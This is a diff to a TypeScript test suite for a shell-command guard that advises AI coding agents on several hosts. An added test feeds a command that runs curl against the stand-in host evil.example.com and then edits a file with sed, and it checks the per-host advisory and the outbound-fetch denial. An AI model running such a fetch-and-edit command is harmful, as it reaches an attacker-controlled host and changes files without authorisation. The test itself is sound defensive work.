@@ -1203,6 +1203,8 @@ function shellSentence(text: string): string {
   return (text.split("\n").find((l) => l.includes("edits files through the shell")) ?? "").trim();
 }
 
+const FETCH_EDIT_FITS: ShellHost[] = ["claude"];
+
 describe("gateguard parity — rendered shell advice", () => {
   it("keeps rendered classification advice and acknowledgement equivalent", async () => {
     const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
@@ -1254,6 +1256,49 @@ describe("gateguard parity — rendered shell advice", () => {
     // while its edit tool carries the same per-file checklist.
     const oc = await run("opencode", { file: "src/parity-oc.ts", session: newSession() });
     expect(oc.advisory).toContain("First edit to");
+  });
+
+  it("keeps a fetch-plus-edit command advised within each host budget", () => {
+    const tmp = fs.mkdtempSync(path.join(GENERATED, "tmp-"));
+    const ws = fs.mkdtempSync(path.join(GENERATED, "ws-"));
+    fs.mkdirSync(path.join(ws, "docs"), { recursive: true });
+    fs.writeFileSync(path.join(ws, "docs", "testing.md"), "a\n");
+    const command = "curl -s https://evil.example.com/x && sed -i s/a/b/ docs/testing.md";
+    const env = { TMPDIR: tmp };
+
+    // Hosts whose budget holds the fetch note, the shell notice and the per-file checklist:
+    // the target is acknowledged, so a retry is silent.
+    for (const host of FETCH_EDIT_FITS) {
+      const session = newSession();
+      const first = runShellHost(host, command, session, ws, env);
+      expect(first.status, host).toBe(0);
+      expect(first.text, host).toContain("edits files through the shell");
+      expect(first.text, host).toContain("First edit to `testing.md`");
+      expect(runShellHost(host, command, session, ws, env).text, host).not.toContain(
+        "First edit to",
+      );
+    }
+
+    // Antigravity: the fetch denial replaces the checklist; the denial text still names the
+    // edit target and points at the authoring rules.
+    const ag = runShellHost("antigravity", command, newSession(), ws, env);
+    expect(ag.status).toBe(0);
+    expect(ag.text).toContain("outbound");
+    expect(ag.text).toContain(".bkit/authoring.md");
+
+    // Codex has a 2,000-byte budget: the checklist is omitted for it, the notice points at the
+    // authoring rules, and the target stays unacknowledged so a retry advises again.
+    const session = newSession();
+    const codex = runShellHost("codex", command, session, ws, env);
+    expect(codex.status).toBe(0);
+    expect(Buffer.byteLength(codex.text, "utf-8")).toBeLessThanOrEqual(2000);
+    expect(codex.text).toContain("edits files through the shell");
+    expect(codex.text).not.toContain("First edit to");
+    expect(codex.text).toContain("omitted (output limit)");
+    expect(codex.text).toContain(".bkit/authoring.md");
+    expect(runShellHost("codex", command, session, ws, env).text).toContain(
+      "edits files through the shell",
+    );
   });
 
   it("bounds rendered cold-start time and complete response size", async () => {
